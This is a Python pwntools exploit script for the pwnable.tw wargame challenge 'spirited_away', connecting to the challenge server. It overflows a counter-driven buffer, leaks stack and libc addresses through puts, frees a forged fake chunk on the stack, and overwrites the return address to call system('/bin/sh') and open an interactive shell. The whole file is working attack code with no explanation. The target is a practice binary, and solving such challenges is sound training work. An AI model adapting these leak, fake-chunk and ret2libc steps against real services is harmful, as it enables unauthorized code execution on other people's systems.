from pwn import *

context.log_level = 'debug'
context.arch = "i386"
context.terminal = ["tmux","splitw","-h"]

def Name(io,name):
    io.sendafter(b"Please enter your name: ", name)

def Age(io,age):
    io.sendlineafter(b"Please enter your age: ",str(age).encode())

def Reason(io,reason):
    io.sendafter(b"Why did you came to see this movie? ",reason)

def Comment(io,comm):
    io.sendafter(b"Please enter your comment: ", comm )

def Continue(io,ch):
    io.sendafter(b"Would you like to leave another comment? <y/n>: ", ch)

def make_overflow(io):
    for i in range(110):
        if i >= 10 and i<100:
            Name(io,b"")
        else:
            Name(io,b"a")
        Age(io,i+1)
        Reason(io,b"null")
        Comment(io,b"dull")
        Continue(io,b"y")
    # nbtytes overflowed to 110

def leak_stack(io):
    Name(io,b"Overflow comment")
    Age(io,114514)
    Reason(io,b"a"*80)
    Comment(io,b"dull")
    io.recvuntil(b"Reason: ")
    main_ebp = u32(io.recvline().strip(b"\n")[80:84])
    survey_ebp = main_ebp & 0xFFFFFFF0
    survey_ebp-= 0x10
    survey_ebp-= 8
    success("leak ebp at:"+hex(survey_ebp))
    Continue(io,b"y")
    return survey_ebp,main_ebp

    # Fake chunk
    # fake_chunk = p32(0o21)+p32(0o71)+b"a"*0o60           # remain 0o20
    # fake_chunk+= p32(0o71)+p32(0o21)+b"b"*0o10           # remain 0o10
    # fake_chunk+= p32(0o21)+p32(0o21)            
    # assert len(fake_chunk) <= 80
    # Reason(io,fake_chunk)
    # # Set name to 
    # Comment(io,b"a"*80+p32(514114)+p32(0x804A060))

def free_fake_chunk(io,survey_ebp):
    Name(io,b"free fake_chunk")
    Age(io,18)
    # Fake chunk
    fake_chunk = p32(0o21)+p32(0o101)+b"this is a fake chunk".ljust(0o70,b".")           # remain 0o20
    fake_chunk+= p32(0o101)+p32(0o11)                     # remain 0o10
    fake_chunk+= p32(0o11)+p32(0o21)    
    assert len(fake_chunk) <= 80
    Reason(io,fake_chunk)
    # Set name to 
    Comment(io,b"a"*80+p32(514114)+p32(survey_ebp-80+8)) 
    Continue(io,b"y")

def leak_libc(io,survey_ebp,main_ebp,_bin:ELF):
    Name(io, b"a"*72 + p32(main_ebp) + p32(_bin.plt["puts"]) + p32(_bin.sym['main']) + p32(_bin.got["puts"]))
    Age(io,1)
    Reason(io,b"A")
    Comment(io,b"A")
    Continue(io,b"N")
    io.recvuntil(b"Bye!\n")
    puts_addr = u32(io.recvline()[:4])
    return puts_addr

def hack(io,survey_ebp, main_ebp, libc):
    Name(io, b"a"*72 + p32(main_ebp) + p32(libc.sym["system"]) + b"aaaa" + p32(survey_ebp+16) + b"/bin/sh\0")
    Age(io,1)
    Reason(io,b"A")
    Comment(io,b"A")
    Continue(io,b"N")

DEBUG = False


"""
1. set cnt>=100
2. overflow nbytes='n' (110)
3. overflow comment, to set name = reason
4. create fake chunk at reason
"""

if __name__ == '__main__':
    if DEBUG:
        io = process("./spirited_away")
    else:
        io = remote("chall.pwnable.tw",10204)
    _bin = ELF("./spirited_away")
    libc = ELF("libc_32.so.6")
    info("Making overflow ... ")
    make_overflow(io)
    survey_ebp,main_ebp = leak_stack(io)
    free_fake_chunk(io,survey_ebp)

    libc.address = leak_libc(io,survey_ebp,main_ebp,_bin) - libc.sym["puts"]
    success("Leaked libc at :"+hex(libc.address))

    info("Retry leak stack and free fake chunk")

    Name(io,b"b")
    Age(io,1)
    Reason(io,b"a")
    Comment(io,b"a")
    Continue(io,b"y")

    survey_ebp,main_ebp = leak_stack(io)    
    success("leak stack at : "+hex(survey_ebp))
    free_fake_chunk(io,survey_ebp)
    hack(io,survey_ebp,main_ebp,libc)
    # gdb.attach(io,gdbscript="b *0x80488CE\nc\n")
    io.interactive()